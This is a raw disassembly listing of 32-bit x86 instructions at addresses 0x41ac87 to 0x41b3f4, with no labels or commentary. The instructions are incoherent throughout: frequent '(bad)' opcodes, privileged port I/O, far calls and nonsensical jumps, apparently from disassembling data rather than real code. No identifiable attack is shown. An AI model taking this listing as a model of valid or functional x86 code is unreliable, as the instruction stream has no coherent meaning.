  41ac87:	jmp    DWORD PTR [edx-0xd]
  41ac8a:	mov    ebp,0x8011a749
  41ac8f:	cwde   
  41ac90:	daa    
  41ac91:	dec    eax
  41ac92:	push   cs
  41ac93:	or     BYTE PTR [ebp+esi*8-0x64dcecd5],0x38
  41ac9b:	inc    ebp
  41ac9d:	into   
  41ac9e:	jo     0x41ac88
  41aca0:	call   0xa9b97dce
  41aca5:	dec    ebp
  41aca6:	neg    DWORD PTR es:[ecx+0x2ffec8cc]
  41acad:	mov    eax,eax
  41acaf:	mov    es,WORD PTR [eax-0x4a]
  41acb2:	fldcw  WORD PTR [eax+eiz*2-0x6e]
  41acb6:	sub    ch,BYTE PTR [edi]
  41acb8:	jmp    0x52a7b87d
  41acbd:	xor    dh,bl
  41acbf:	dec    esp
  41acc0:	mov    dl,0x29
  41acc2:	dec    edx
  41acc3:	out    0x84,al
  41acc5:	pop    es
  41acc6:	jns    0x41ad45
  41acc8:	sti    
  41acc9:	(bad)  [ebp+0x6b1143d2]
  41accf:	inc    esi
  41acd0:	lea    ebx,[eax+0xb5fe5d3]
  41acd6:	adc    ch,cl
  41acd8:	out    dx,eax
  41acd9:	cwde   
  41acda:	fwait
  41acdb:	add    dl,BYTE PTR [ecx]
  41acdd:	inc    ebp
  41acde:	add    eax,0x3200b0bd
  41ace3:	sub    bh,BYTE PTR [eax-0x13f89c38]
  41ace9:	adc    ch,BYTE PTR [ebp-0x66874272]
  41acef:	jmp    0x3662f52b
  41acf4:	iret   
  41acf5:	or     eax,0xa5d1bb9c
  41acfa:	loope  0x41ad68
  41acfc:	push   esp
  41acfd:	sub    BYTE PTR [eax+0x5b175841],ch
  41ad03:	mov    esi,0xbff80070
  41ad08:	mov    ebx,0xa106eea9
  41ad0d:	sbb    DWORD PTR [ecx-0x4c347c24],0xffffffbb
  41ad14:	and    DWORD PTR ds:0xc43b584f,esp
  41ad1a:	push   0x7f
  41ad1c:	push   ebx
  41ad1d:	popf   
  41ad1e:	popf   
  41ad1f:	sub    ebx,edi
  41ad21:	inc    ecx
  41ad22:	enter  0x3e60,0xe0
  41ad26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad27:	test   al,0x9b
  41ad29:	mov    bl,0x2e
  41ad2b:	inc    eax
  41ad2c:	pop    eax
  41ad2d:	jg     0x41ad65
  41ad2f:	xor    DWORD PTR [esi-0x26],edx
  41ad32:	adc    BYTE PTR [ecx+0x70],dl
  41ad35:	inc    ebp
  41ad36:	mov    ebp,0xe49c88
  41ad3b:	jmp    FWORD PTR [edi-0x67]
  41ad3e:	mov    edi,0xe33f285c
  41ad43:	fwait
  41ad44:	(bad)  
  41ad45:	mov    dl,BYTE PTR [ecx-0x81aa109]
  41ad4b:	and    al,0x81
  41ad4d:	mov    dl,0xc8
  41ad4f:	in     al,0xc6
  41ad51:	bnd jmp 0x2cedb265
  41ad57:	pushf  
  41ad58:	imul   eax,DWORD PTR [ecx-0x40b9278c],0xffffffc5
  41ad5f:	mov    ecx,0x58527eb8
  41ad64:	jne    0x41adc5
  41ad66:	sbb    BYTE PTR [edi-0x101969da],0x7d
  41ad6d:	mov    bl,BYTE PTR [edx]
  41ad6f:	imul   esp,DWORD PTR [eax],0xd5056184
  41ad75:	sar    esp,1
  41ad77:	ror    DWORD PTR [ecx+0x67b03741],1
  41ad7d:	mov    eax,ds:0x3ad622d5
  41ad82:	push   esi
  41ad83:	inc    edi
  41ad84:	out    dx,al
  41ad85:	jae    0x41ad3d
  41ad87:	pusha  
  41ad88:	iret   
  41ad89:	dec    esp
  41ad8a:	mov    cl,0x71
  41ad8c:	scas   al,BYTE PTR es:[edi]
  41ad8d:	jbe    0x41ad8e
  41ad8f:	dec    esp
  41ad90:	imul   edx,DWORD PTR [eax+0x2e],0xd3b29d2d
  41ad97:	bound  ebp,QWORD PTR [esi]
  41ad99:	fdivr  DWORD PTR ds:0x85ae3d0b
  41ad9f:	lea    ebp,[edi+0x18]
  41ada2:	xor    DWORD PTR [eax-0x5b],0x5a129334
  41ada9:	pop    edx
  41adaa:	mov    eax,ds:0x4590fc23
  41adaf:	adc    al,BYTE PTR [ebx-0x2413df68]
  41adb5:	(bad)  
  41adb6:	sti    
  41adb7:	sbb    BYTE PTR [eax+0x4e],bh
  41adba:	or     ah,BYTE PTR [edi+0x28]
  41adbd:	pop    es
  41adbe:	aaa    
  41adbf:	pop    ebx
  41adc0:	jp     0x41adcf
  41adc2:	sub    eax,0xe0895006
  41adc7:	pop    edi
  41adc8:	rcr    eax,cl
  41adca:	lahf   
  41adcb:	sbb    DWORD PTR [esi-0x48fdd95e],eax
  41add1:	mov    ebp,0x34b737c1
  41add6:	mov    esp,0x5ea8a364
  41addb:	cmovl  esp,DWORD PTR [ebx-0x66]
  41addf:	int    0x5f
  41ade1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ade2:	(bad)  
  41ade3:	repnz aam 0x26
  41ade6:	mov    WORD PTR [edx],ss
  41ade8:	xchg   edx,eax
  41ade9:	fistp  WORD PTR ds:0x9f7ad16b
  41adef:	imul   DWORD PTR [esp+eiz*4+0x6a]
  41adf3:	mov    ebp,0xd92a5398
  41adf8:	imul   DWORD PTR [ebp*1+0x5368f063]
  41adff:	lods   al,BYTE PTR ds:[esi]
  41ae00:	ds addr16 push eax
  41ae03:	xchg   ebx,eax
  41ae04:	mov    al,ds:0xde64345e
  41ae09:	cmp    al,0x27
  41ae0b:	pop    ecx
  41ae0c:	ss data16 aad 0xd0
  41ae10:	mov    edx,0xff71d5d1
  41ae15:	xor    al,BYTE PTR [ebx]
  41ae17:	std    
  41ae18:	aaa    
  41ae19:	es dec esp
  41ae1b:	xor    eax,0x53d6211d
  41ae20:	dec    ebp
  41ae21:	cmp    DWORD PTR [ebx],esi
  41ae23:	imul   edi,DWORD PTR [edx],0x7a
  41ae26:	mov    edi,0x8c9f105f
  41ae2b:	outs   dx,BYTE PTR ds:[esi]
  41ae2c:	push   es
  41ae2d:	iret   
  41ae2e:	sahf   
  41ae2f:	pusha  
  41ae30:	sbb    bl,BYTE PTR [ebp+0x71]
  41ae33:	cwde   
  41ae34:	sbb    BYTE PTR [edx+0x78a52d14],dl
  41ae3a:	sub    eax,0xf60f5d6
  41ae3f:	sub    BYTE PTR gs:[esi],ah
  41ae42:	pop    ebx
  41ae43:	mov    ds:0x1d76bd4d,al
  41ae48:	leave  
  41ae49:	xchg   edx,eax
  41ae4a:	mov    ebx,0x9a287826
  41ae4f:	call   0xedff73ab
  41ae54:	fcom   QWORD PTR [ebp+0x6a5e5a26]
  41ae5a:	repnz scas al,BYTE PTR es:[edi]
  41ae5c:	push   es
  41ae5d:	adc    ch,dh
  41ae5f:	xor    BYTE PTR [edx],0x7e
  41ae62:	jnp    0x41aeab
  41ae64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae65:	mov    ah,0x9b
  41ae67:	ret    0x5966
  41ae6a:	(bad)  
  41ae6b:	into   
  41ae6c:	dec    eax
  41ae6d:	push   cs
  41ae6e:	jl     0x41ae46
  41ae70:	repz mov ds:0x31a3579,eax
  41ae76:	and    BYTE PTR [esi],dh
  41ae78:	imul   edx,DWORD PTR [ebx+0x3],0x2882c3e8
  41ae7f:	or     eax,0x92b1c887
  41ae84:	xor    esi,edx
  41ae86:	aam    0x1b
  41ae88:	outs   dx,BYTE PTR ds:[esi]
  41ae89:	mov    eax,0x52397141
  41ae8e:	(bad)  
  41ae8f:	xor    al,0x13
  41ae91:	xchg   ebx,eax
  41ae92:	pop    ss
  41ae93:	xchg   DWORD PTR [eax],ebx
  41ae95:	jb     0x41aed2
  41ae97:	sub    eax,0x3f5bf1e4
  41ae9c:	(bad)  
  41ae9d:	shr    BYTE PTR [edx+0x391f7ab3],1
  41aea3:	mov    edi,0xdbe56b2f
  41aea8:	pop    ebp
  41aea9:	int    0x87
  41aeab:	inc    esp
  41aeac:	lods   eax,DWORD PTR ds:[esi]
  41aead:	mov    BYTE PTR [esi-0x7c],dh
  41aeb0:	inc    esi
  41aeb1:	imul   ebx,DWORD PTR [ebp-0x42eefc21],0x2deb59ef
  41aebb:	hlt    
  41aebc:	fmul   st(2),st
  41aebe:	mov    ebp,0xf959b1e7
  41aec3:	mov    ss,WORD PTR [eax]
  41aec5:	xchg   edx,eax
  41aec6:	sub    eax,0x6ae2171c
  41aecb:	pop    edx
  41aecc:	and    eax,0x9bac0978
  41aed1:	mov    esi,0x16a287ba
  41aed6:	out    0xb0,eax
  41aed8:	or     cl,BYTE PTR [ecx+0x6b]
  41aedb:	pop    ss
  41aedc:	rol    BYTE PTR ds:0xb49a,cl
  41aee1:	xor    DWORD PTR [edx+0x12],0x52
  41aee5:	test   BYTE PTR [ebx],cl
  41aee7:	xchg   ecx,eax
  41aee8:	xor    BYTE PTR [ebx+0x1c8593f0],bh
  41aeee:	ins    BYTE PTR es:[edi],dx
  41aeef:	mov    bl,0x14
  41aef1:	in     al,0xda
  41aef3:	je     0x41aebc
  41aef5:	push   ecx
  41aef6:	std    
  41aef7:	out    dx,eax
  41aef8:	jns    0x41ae83
  41aefa:	in     eax,dx
  41aefb:	mov    esp,0xf10c51a5
  41af00:	sub    BYTE PTR [ebp+0x720f651f],al
  41af06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af07:	cmp    bh,0xa8
  41af0a:	push   es
  41af0b:	popf   
  41af0c:	and    ah,ch
  41af0e:	es fwait
  41af10:	push   es
  41af11:	adc    al,0x8e
  41af13:	loope  0x41af80
  41af15:	sub    al,0x26
  41af17:	(bad)  
  41af18:	popf   
  41af19:	push   esi
  41af1a:	push   edx
  41af1b:	mov    bl,0xc4
  41af1d:	sub    edx,esi
  41af1f:	in     al,dx
  41af20:	cmp    al,0xb6
  41af22:	add    bl,al
  41af24:	cmp    eax,0x905797f9
  41af29:	inc    esp
  41af2a:	fidivr WORD PTR [ebx]
  41af2c:	dec    edi
  41af2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af2e:	pop    edx
  41af2f:	mov    ds:0x2e73e9dc,eax
  41af34:	(bad)  
  41af35:	jns    0x41aeb7
  41af37:	push   ebp
  41af38:	call   0x2ff60ba8
  41af3d:	fst    st(5)
  41af3f:	cmp    eax,0xffffffce
  41af42:	mov    ?,WORD PTR [ebx-0x3ccbfa9c]
  41af48:	sbb    ch,BYTE PTR [edx+0x28b387a4]
  41af4e:	cmp    ebp,edi
  41af50:	xor    BYTE PTR [edx],al
  41af52:	mov    es,WORD PTR [esi+0x21a3b74e]
  41af58:	mov    esi,0x1f5d1638
  41af5d:	mov    al,0x13
  41af5f:	cs pop ss
  41af61:	xor    dl,BYTE PTR [edi]
  41af63:	outs   dx,DWORD PTR ds:[esi]
  41af64:	push   cs
  41af65:	les    ecx,FWORD PTR [edi+eax*1-0x2229edb]
  41af6c:	mov    ebp,0xaecf75f4
  41af71:	(bad)  
  41af72:	popf   
  41af73:	xor    BYTE PTR [eax],ch
  41af75:	leave  
  41af76:	arpl   WORD PTR [ebx-0x69d6cf81],di
  41af7c:	fwait
  41af7d:	sub    al,0x93
  41af7f:	sbb    ebx,ecx
  41af81:	adc    DWORD PTR [edx+0x725da26f],eax
  41af87:	mov    ds:0xca83f35e,eax
  41af8c:	rol    DWORD PTR ds:0xd2c3a421,0xc9
  41af93:	xchg   ebp,eax
  41af94:	leave  
  41af95:	mov    ds:0x204e72e1,eax
  41af9a:	inc    esp
  41af9b:	int3   
  41af9c:	addr16 in al,0x54
  41af9f:	(bad)  
  41afa0:	sahf   
  41afa1:	mov    esi,0xdc39e292
  41afa6:	retf   0x2560
  41afa9:	jae    0x41af68
  41afab:	aad    0x3c
  41afad:	jbe    0x41b024
  41afaf:	stc    
  41afb0:	adc    al,0x4d
  41afb2:	adc    cl,al
  41afb4:	out    0x1b,al
  41afb6:	xor    BYTE PTR [edi-0x37a5fc06],bh
  41afbc:	jle    0x41afbe
  41afbe:	pop    esi
  41afbf:	sbb    al,0x2f
  41afc1:	outs   dx,BYTE PTR ds:[esi]
  41afc2:	mov    edx,0xc65b8dfa
  41afc7:	and    DWORD PTR [ebx],ebp
  41afc9:	fmul   DWORD PTR [edi]
  41afcb:	mov    eax,ds:0x8f8ef9e4
  41afd0:	(bad)  
  41afd1:	xchg   dl,cl
  41afd3:	call   0xce03d30b
  41afd8:	add    BYTE PTR [ebp+0x5d],dh
  41afdb:	sub    al,0x9c
  41afdd:	scas   al,BYTE PTR es:[edi]
  41afde:	repnz out dx,eax
  41afe0:	sbb    eax,0x21aa32ad
  41afe5:	pop    es
  41afe6:	push   ss
  41afe7:	mov    esp,0x47288f7d
  41afec:	aas    
  41afed:	jle    0x41af8f
  41afef:	jl     0x41af9e
  41aff1:	addr16 jge 0x41afd2
  41aff4:	out    0x83,eax
  41aff6:	lock mov bl,0x7b
  41aff9:	ds push ebp
  41affb:	mov    bl,0x4b
  41affd:	jmp    0x80cce1e6
  41b002:	daa    
  41b003:	ss inc ebp
  41b005:	daa    
  41b006:	and    al,0x7b
  41b008:	ins    DWORD PTR es:[edi],dx
  41b009:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  41b00b:	and    esi,eax
  41b00d:	pop    ss
  41b00e:	push   ebp
  41b00f:	add    BYTE PTR [ebp+0x60ec79f9],bl
  41b015:	clc    
  41b016:	dec    ebp
  41b017:	lahf   
  41b018:	jg     0x41b01f
  41b01a:	xchg   ebx,eax
  41b01c:	mov    edi,0x7448226b
  41b021:	outs   dx,BYTE PTR ds:[esi]
  41b022:	sti    
  41b023:	and    al,0x5
  41b025:	adc    eax,0xacd1d42b
  41b02a:	adc    edx,ebx
  41b02c:	push   0xffffffd5
  41b02e:	sub    bl,bh
  41b030:	push   ebx
  41b031:	xchg   ecx,eax
  41b032:	fldcw  WORD PTR [edx+0x31]
  41b035:	pop    ss
  41b036:	std    
  41b037:	retf   0x621d
  41b03a:	stos   DWORD PTR es:[edi],eax
  41b03b:	arpl   WORD PTR [eax],sp
  41b03d:	call   0xabab:0x99acf514
  41b044:	pop    eax
  41b045:	fisub  WORD PTR [edx]
  41b047:	add    al,0x6f
  41b049:	fisttp DWORD PTR [edx+ebx*2]
  41b04c:	stos   BYTE PTR es:[edi],al
  41b04d:	mov    ch,0x6d
  41b04f:	pop    esp
  41b050:	mov    ecx,0x1766613d
  41b055:	adc    al,BYTE PTR [ebp*1-0x6fccbfdf]
  41b05c:	mov    dh,0x52
  41b05e:	push   0xffffff92
  41b060:	xchg   edx,eax
  41b061:	aad    0xae
  41b063:	addr16 test edx,ecx
  41b066:	mov    ch,0x50
  41b068:	out    0xee,al
  41b06a:	mov    ah,0xc
  41b06c:	sbb    WORD PTR [ecx+0x1fabfa9f],0x2a
  41b074:	xchg   ecx,eax
  41b075:	sbb    al,0x53
  41b077:	mov    al,0x7d
  41b079:	loopne 0x41b09b
  41b07b:	xchg   ecx,eax
  41b07c:	test   DWORD PTR [edx+eiz*8-0x42],edx
  41b080:	sbb    ecx,DWORD PTR [ebx+ebx*4-0x2890ee72]
  41b087:	push   0xdba8e2e3
  41b08c:	les    ebp,FWORD PTR [ecx]
  41b08e:	mov    edi,0xa71629c5
  41b093:	(bad)  
  41b095:	repnz lds esi,FWORD PTR [edx+0x4a5655cb]
  41b09c:	mov    dh,0xbd
  41b09e:	cmp    BYTE PTR [ebp-0x64],bl
  41b0a1:	mov    edx,0x83cf6046
  41b0a6:	rcl    BYTE PTR ds:0x7daf38fa,cl
  41b0ac:	int    0xd4
  41b0ae:	cmp    edx,DWORD PTR [edi+0x2f]
  41b0b1:	cmp    al,0x19
  41b0b3:	adc    DWORD PTR [esp+ebp*2],eax
  41b0b6:	mov    ds:0x7db0d9d8,al
  41b0bb:	cs cmp al,0xe2
  41b0be:	push   0x10
  41b0c0:	push   bp
  41b0c2:	pop    ebx
  41b0c3:	aaa    
  41b0c4:	sub    esp,edi
  41b0c6:	sti    
  41b0c7:	inc    eax
  41b0c8:	sbb    al,0x5c
  41b0ca:	pop    ds
  41b0cb:	adc    eax,0x10606641
  41b0d0:	cdq    
  41b0d1:	mov    ecx,0x4e2934ce
  41b0d6:	test   eax,0x65947fa4
  41b0db:	cld    
  41b0dc:	cdq    
  41b0dd:	pop    es
  41b0de:	cmp    al,0xf3
  41b0e0:	cmp    bh,dl
  41b0e2:	js     0x41b154
  41b0e4:	popa   
  41b0e5:	or     al,0xfd
  41b0e7:	out    dx,al
  41b0e8:	xor    dl,dh
  41b0ea:	cmp    eax,DWORD PTR [eax+0x7]
  41b0ed:	or     al,0x89
  41b0ef:	clc    
  41b0f0:	repz popf 
  41b0f2:	inc    edi
  41b0f3:	aas    
  41b0f4:	les    eax,FWORD PTR [edi]
  41b0f6:	push   edi
  41b0f7:	hlt    
  41b0f8:	xchg   edx,eax
  41b0f9:	shl    ah,1
  41b0fb:	inc    ebx
  41b0fc:	push   ss
  41b0fd:	pop    ebx
  41b0fe:	shl    BYTE PTR [ecx],cl
  41b100:	mov    dl,0x72
  41b102:	push   eax
  41b103:	sti    
  41b104:	adc    ebp,DWORD PTR [edx]
  41b106:	mov    BYTE PTR [ebx],al
  41b108:	lods   al,BYTE PTR ds:[esi]
  41b109:	jns    0x41b148
  41b10b:	dec    ebp
  41b10c:	or     cl,bh
  41b10e:	shl    DWORD PTR [eax],cl
  41b110:	pop    es
  41b111:	inc    ecx
  41b112:	xor    eax,edx
  41b114:	enter  0xdec2,0x1a
  41b118:	repz jg 0x41b0dc
  41b11b:	adc    DWORD PTR [ecx+0x3552bac],esi
  41b121:	loop   0x41b111
  41b123:	fwait
  41b124:	xchg   edi,eax
  41b125:	not    DWORD PTR [esp+ecx*4]
  41b128:	pop    ds
  41b129:	pushf  
  41b12a:	cmp    cl,BYTE PTR [ebx]
  41b12c:	jae    0x41b0e0
  41b12e:	imul   ecx,DWORD PTR [ebx],0x1e
  41b131:	add    eax,0xe0ce82b4
  41b136:	xor    BYTE PTR [ebx+0x34],ch
  41b139:	inc    edi
  41b13a:	cli    
  41b13b:	clc    
  41b13c:	xchg   esi,eax
  41b13d:	sbb    bl,BYTE PTR [esi+0x2b82064]
  41b143:	in     eax,0xd8
  41b145:	pop    ds
  41b146:	cmc    
  41b147:	adc    al,0xd8
  41b149:	js     0x41b13f
  41b14b:	arpl   WORD PTR [esi+0x4a],ax
  41b14e:	lods   al,BYTE PTR ds:[esi]
  41b14f:	sub    BYTE PTR [edi+0x7e5293d],cl
  41b155:	sahf   
  41b156:	popf   
  41b157:	jmp    0x41b158
  41b159:	xor    al,0x47
  41b15b:	dec    eax
  41b15c:	xchg   edx,eax
  41b15d:	jg     0x41b1ca
  41b15f:	add    DWORD PTR [edx-0x72],esi
  41b162:	xor    al,0x7
  41b164:	not    BYTE PTR [edx]
  41b166:	or     bl,BYTE PTR [ebp+0x1b6cf219]
  41b16c:	xor    ebp,ecx
  41b16e:	sub    cl,BYTE PTR [esi-0x71f6e941]
  41b174:	xor    ecx,DWORD PTR [edx+0x4]
  41b177:	rol    BYTE PTR [ebp-0xe9a3773],cl
  41b17d:	enter  0xa277,0xcc
  41b181:	jae    0x41b147
  41b183:	pop    ebx
  41b184:	xor    ch,dh
  41b186:	pop    esp
  41b187:	pop    ds
  41b188:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b189:	jne    0x41b14f
  41b18b:	fucomi st,st(1)
  41b18d:	xchg   edi,eax
  41b18e:	scas   eax,DWORD PTR es:[edi]
  41b18f:	add    DWORD PTR [ebx],0x7b0cee7e
  41b195:	imul   eax,DWORD PTR [eax-0x2d462cb3],0xe4b6788
  41b19f:	(bad)  
  41b1a0:	outs   dx,DWORD PTR ds:[esi]
  41b1a1:	punpckhbw mm0,QWORD PTR [eax-0x1b]
  41b1a5:	mov    ch,BYTE PTR [ecx+edi*2]
  41b1a8:	std    
  41b1a9:	test   edi,edi
  41b1ab:	dec    ecx
  41b1ac:	ja     0x41b1c8
  41b1ae:	ins    DWORD PTR es:[edi],dx
  41b1af:	aad    0xf0
  41b1b1:	sbb    eax,DWORD PTR [eax]
  41b1b3:	call   0x1e2b:0x6f4d2c5f
  41b1ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b1bb:	add    al,0x15
  41b1bd:	adc    al,0x63
  41b1bf:	mov    bh,0x7f
  41b1c1:	and    al,0xb3
  41b1c3:	sbb    DWORD PTR [edx+0xc],0x51e68b2e
  41b1ca:	and    DWORD PTR [eax],ebx
  41b1cc:	mov    esi,0x98e16aab
  41b1d1:	stc    
  41b1d2:	mov    dh,BYTE PTR [edi+0x70fb5e3b]
  41b1d8:	sbb    eax,DWORD PTR [eax+0x31b173d4]
  41b1de:	inc    edi
  41b1df:	push   ebp
  41b1e0:	mov    ds:0x61e34b67,eax
  41b1e5:	rol    DWORD PTR [eax-0x34],1
  41b1e8:	xor    DWORD PTR [eax+eiz*8],0xffffffd2
  41b1ec:	push   esp
  41b1ed:	add    DWORD PTR [edx+ebx*1-0x3bdcd879],edx
  41b1f4:	lods   eax,DWORD PTR ds:[esi]
  41b1f5:	sti    
  41b1f6:	add    DWORD PTR [edi-0x7f030a9d],edi
  41b1fc:	mov    bl,0x7b
  41b1fe:	pop    edx
  41b1ff:	test   ebp,ecx
  41b201:	(bad)  
  41b202:	dec    ecx
  41b203:	aam    0xa
  41b205:	std    
  41b206:	ret    
  41b207:	push   edi
  41b208:	(bad)  
  41b209:	test   BYTE PTR [edi-0x38],ch
  41b20c:	mov    ds:0x548f0aaf,al
  41b211:	jp     0x41b1b4
  41b213:	xor    al,BYTE PTR [ebx+0x15]
  41b216:	sub    eax,DWORD PTR [edi-0x3]
  41b219:	inc    edx
  41b21a:	inc    esi
  41b21b:	std    
  41b21c:	xchg   ebp,eax
  41b21d:	fdiv   DWORD PTR [esi]
  41b21f:	or     dh,dl
  41b221:	stos   DWORD PTR es:[edi],eax
  41b222:	and    DWORD PTR [ebp-0x72],edx
  41b225:	ds das 
  41b227:	push   ss
  41b228:	test   al,0xac
  41b22a:	jg     0x41b1b7
  41b22c:	aaa    
  41b22d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b22e:	push   ecx
  41b22f:	xchg   edx,eax
  41b230:	push   ds
  41b231:	jo     0x41b1bc
  41b233:	xchg   esp,eax
  41b234:	out    0xa5,al
  41b236:	pushf  
  41b237:	push   edi
  41b238:	outs   dx,DWORD PTR ds:[esi]
  41b239:	dec    edx
  41b23a:	ret    0xc3d9
  41b23d:	(bad)  
  41b23e:	jg     0x41b1c1
  41b240:	in     eax,dx
  41b241:	add    eax,0xb02979f2
  41b246:	lods   eax,DWORD PTR ds:[esi]
  41b247:	jae    0x41b1cd
  41b249:	stos   BYTE PTR es:[edi],al
  41b24a:	mov    ds:0xf9f1f905,al
  41b24f:	shr    al,0x48
  41b252:	mov    dx,0xb4fa
  41b256:	sbb    bh,cl
  41b258:	addr16 push 0x11
  41b25b:	adc    eax,0xa029ae42
  41b260:	ins    DWORD PTR es:[edi],dx
  41b261:	outs   dx,BYTE PTR ds:[esi]
  41b262:	mov    ecx,DWORD PTR [ebx+ebp*8-0x77c8fe80]
  41b269:	shl    BYTE PTR [ecx],cl
  41b26b:	in     eax,dx
  41b26c:	adc    ecx,eax
  41b26e:	cmp    DWORD PTR [eax+0x10212919],ebx
  41b274:	inc    edx
  41b275:	or     dl,bh
  41b277:	mov    ch,0xe2
  41b279:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b27a:	outs   dx,BYTE PTR ds:[esi]
  41b27b:	imul   edi,DWORD PTR [edi+eax*2],0xda5b7c89
  41b282:	mov    cl,BYTE PTR [ecx+0x26ed3b4d]
  41b288:	jmp    0x41b2c9
  41b28a:	jg     0x41b2ec
  41b28c:	and    DWORD PTR [ebp+ebp*4+0x57],esi
  41b290:	or     BYTE PTR [esi-0x68e9408d],dh
  41b296:	jg     0x41b23b
  41b298:	aad    0x6b
  41b29a:	xchg   ebx,eax
  41b29b:	repz xchg edi,eax
  41b29d:	mov    ds:0xf9fb7e20,al
  41b2a2:	pop    ds
  41b2a3:	lds    eax,FWORD PTR [ebp-0x39]
  41b2a6:	scas   eax,DWORD PTR es:[edi]
  41b2a7:	shr    DWORD PTR [eax],1
  41b2a9:	inc    ebp
  41b2aa:	sub    BYTE PTR [eax+0x79f338dd],bh
  41b2b0:	into   
  41b2b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b2b2:	hlt    
  41b2b3:	(bad)  
  41b2b4:	jecxz  0x41b2bb
  41b2b6:	and    eax,0xc394435f
  41b2bb:	dec    eax
  41b2bc:	lods   eax,DWORD PTR ds:[esi]
  41b2bd:	ret    0x25a0
  41b2c0:	in     eax,dx
  41b2c1:	data16 jecxz 0x41b305
  41b2c4:	js     0x41b25b
  41b2c6:	push   edi
  41b2c7:	jg     0x41b2d4
  41b2c9:	push   ebp
  41b2ca:	mov    esi,0x9af9a8ff
  41b2cf:	pop    esp
  41b2d0:	add    eax,0x8808d715
  41b2d5:	push   esp
  41b2d6:	adc    bl,BYTE PTR [ebx+0x2d2835a9]
  41b2dc:	int3   
  41b2dd:	repz jmp 0x41b28a
  41b2e0:	cdq    
  41b2e1:	out    dx,al
  41b2e2:	loope  0x41b26a
  41b2e4:	cmp    DWORD PTR [edx+eiz*1+0x34378975],0x4e6b0d00
  41b2ef:	cmp    edx,DWORD PTR [esi]
  41b2f1:	sub    dh,cl
  41b2f3:	ins    DWORD PTR es:[edi],dx
  41b2f4:	rcr    DWORD PTR [ebx-0x45],1
  41b2f7:	call   0xd0de:0xe3b23b2f
  41b2fe:	lahf   
  41b2ff:	push   ebp
  41b300:	add    esi,ebx
  41b302:	gs jg  0x41b35f
  41b305:	jae    0x41b33a
  41b307:	inc    ecx
  41b308:	sahf   
  41b309:	adc    dl,BYTE PTR [edx+0x7c]
  41b30c:	outs   dx,DWORD PTR ds:[esi]
  41b30d:	jp     0x41b311
  41b30f:	ret    0x92da
  41b312:	loop   0x41b32f
  41b314:	out    0xdd,eax
  41b316:	into   
  41b317:	enter  0x2f0c,0x98
  41b31b:	ja     0x41b309
  41b31d:	pop    esp
  41b31e:	je     0x41b39c
  41b320:	sbb    ecx,DWORD PTR ds:0xbbaa17a6
  41b326:	push   edi
  41b327:	jb     0x41b2cc
  41b329:	mov    BYTE PTR [eax+0x14],0xa7
  41b32d:	(bad)  
  41b32e:	fnsave [ebx+0x7e]
  41b331:	les    esp,FWORD PTR [edx+ecx*4-0x2a]
  41b335:	loope  0x41b38e
  41b337:	inc    edx
  41b338:	enter  0xce45,0x61
  41b33c:	xchg   DWORD PTR [ecx+0x1a07237a],edx
  41b342:	pop    ds
  41b343:	outs   dx,DWORD PTR ds:[esi]
  41b344:	lods   al,BYTE PTR ds:[esi]
  41b345:	push   ds
  41b346:	dec    eax
  41b347:	mov    al,BYTE PTR [edx]
  41b349:	adc    eax,0xef05987f
  41b34e:	inc    ebp
  41b34f:	pusha  
  41b350:	inc    ecx
  41b351:	sbb    DWORD PTR [eax],ecx
  41b353:	stos   BYTE PTR es:[edi],al
  41b354:	das    
  41b355:	mov    ebp,DWORD PTR [edi-0x495bf643]
  41b35b:	or     DWORD PTR [edx+0x78],0xa49baff0
  41b362:	cs leave 
  41b364:	stos   BYTE PTR es:[edi],al
  41b365:	and    BYTE PTR [esi],ch
  41b367:	fcom   st(1)
  41b369:	or     al,0x3
  41b36b:	jno    0x41b357
  41b36d:	cmp    al,0x49
  41b36f:	lock mov WORD PTR [ecx+ebp*1-0x724188af],ss
  41b377:	push   ss
  41b378:	(bad)  
  41b379:	jg     0x41b369
  41b37b:	ins    DWORD PTR es:[edi],dx
  41b37c:	lahf   
  41b37d:	call   0x225dd162
  41b382:	nop
  41b383:	mov    al,0xd2
  41b385:	iret   
  41b386:	pop    ds
  41b387:	inc    ebx
  41b388:	sahf   
  41b389:	xor    ebx,DWORD PTR [edx]
  41b38b:	cwde   
  41b38c:	dec    ebp
  41b38d:	jb     0x41b332
  41b38f:	sub    eax,0x1176e343
  41b394:	xchg   esi,eax
  41b395:	das    
  41b396:	dec    ebx
  41b397:	xor    bh,BYTE PTR [edx-0x39bade5]
  41b39d:	imul   edi,DWORD PTR [ecx],0x50a38ce
  41b3a3:	push   esp
  41b3a4:	les    ecx,FWORD PTR [ebx-0xb]
  41b3a7:	adc    al,0xdf
  41b3a9:	(bad)
  41b3ac:	mov    al,ds:0x8c986cf
  41b3b1:	mov    edi,0xf71d35b
  41b3b6:	push   ds
  41b3b7:	lahf   
  41b3b8:	ss stos BYTE PTR es:[edi],al
  41b3ba:	hlt    
  41b3bb:	dec    ebx
  41b3bc:	cmp    eax,0x2bb0dc63
  41b3c1:	xchg   esi,eax
  41b3c2:	gs mov edx,0x2f324073
  41b3c8:	inc    ebp
  41b3c9:	fdivr  QWORD PTR [edi+eax*2+0x49]
  41b3cd:	not    DWORD PTR [ecx-0x4fcfa07a]
  41b3d3:	xchg   esi,eax
  41b3d4:	fadd   DWORD PTR [esp+eax*2]
  41b3d7:	in     al,dx
  41b3d8:	inc    ebx
  41b3d9:	int3   
  41b3da:	in     eax,dx
  41b3db:	outs   dx,DWORD PTR ds:[esi]
  41b3dc:	push   edi
  41b3dd:	push   0x38
  41b3df:	cmp    ah,bh
  41b3e1:	pop    es
  41b3e2:	push   esp
  41b3e3:	sbb    esp,DWORD PTR [edi]
  41b3e5:	jmp    0x41b441
  41b3e7:	call   0xc524992
  41b3ec:	adc    edx,DWORD PTR [esi-0x45b02aad]
  41b3f2:	lods   al,BYTE PTR ds:[esi]
  41b3f3:	inc    edx
  41b3f4:	rcl    BYTE PTR [bp+di+0x5044],cl
